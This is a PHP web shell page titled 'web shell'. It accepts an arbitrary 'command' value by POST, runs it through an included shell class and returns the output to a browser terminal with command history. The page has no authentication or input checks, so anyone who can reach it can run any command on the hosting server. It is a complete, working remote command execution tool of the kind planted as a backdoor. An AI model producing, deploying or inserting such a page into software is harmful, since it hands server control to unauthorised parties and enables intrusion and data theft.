<?php
/**
 * @author 肖其顿 <xiaoqidun@gmail.com>
 */
$command = isset($_POST['command']) ? strval($_POST['command']) : "";
if ($command !== "") {
    require 'shell.class.php';
    echo shell::command($command, "echo pwd", true);
    exit;
}
?>
<html>
<head>
    <title>web shell</title>
    <style type="text/css">
        .author {
            width: 100%;
            color: white;
            text-align: center;
            background-color: black;
        }

        .commandInput {
            width: 100%;
            height: 3%;
            color: white;
            background-color: black;
        }

        .commandResult {
            width: 100%;
            height: 75%;
            color: white;
            overflow: scroll;
            background-color: black;
        }

        .commandHistory {
            width: 100%;
            height: 15%;
            color: white;
            overflow: scroll;
            background-color: black;
        }
    </style>
    <script type="text/javascript">
        function enter() {
            if (event.keyCode == 13) {
                command();
            }
        }

        function command() {
            var commandInput = document.getElementById('commandInput');
            if (commandInput.value.length > 0) {
                var commandResult = document.getElementById('commandResult');
                var commandHistory = document.getElementById('commandHistory');
                if (commandHistory.innerHTML.length < 1) {
                    commandHistory.innerHTML = commandInput.value;
                } else {
                    commandHistory.innerHTML = commandHistory.innerHTML + "\n" + commandInput.value;
                }
                commandHistory.scrollTop = commandHistory.scrollHeight;
                if (commandInput.value === 'clear') {
                    commandInput.value = "";
                    commandResult.innerHTML = "";
                    commandHistory.innerHTML = "";
                    return;
                }
                command_ajax();
            }
        }

        function command_ajax() {
            var xmlHttp = new XMLHttpRequest;
            var commandInput = document.getElementById('commandInput');
            var commandResult = document.getElementById('commandResult');
            xmlHttp.open("POST", "?", true);
            xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xmlHttp.send("command=" + encodeURI(commandInput.value));
            commandInput.value = "";
            xmlHttp.onreadystatechange = function () {
                if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
                    if (commandResult.innerHTML.length < 1) {
                        commandResult.innerHTML = xmlHttp.responseText;
                    } else {
                        commandResult.innerHTML = commandResult.innerHTML + "\n" + xmlHttp.responseText;
                    }
                    commandResult.scrollTop = commandResult.scrollHeight;
                }
            }
        }
    </script>
</head>
<body>
<input id="commandInput" class="commandInput" onkeydown="enter()" placeholder="command">
<pre id="commandHistory" class="commandHistory"></pre>
<pre id="commandResult" class="commandResult"></pre>
<div class="author">
    CopyRight © 2017-<?= date("Y") ?> xiaoqidun@gmail.com All Rights Reserved
</div>
</body>
</html>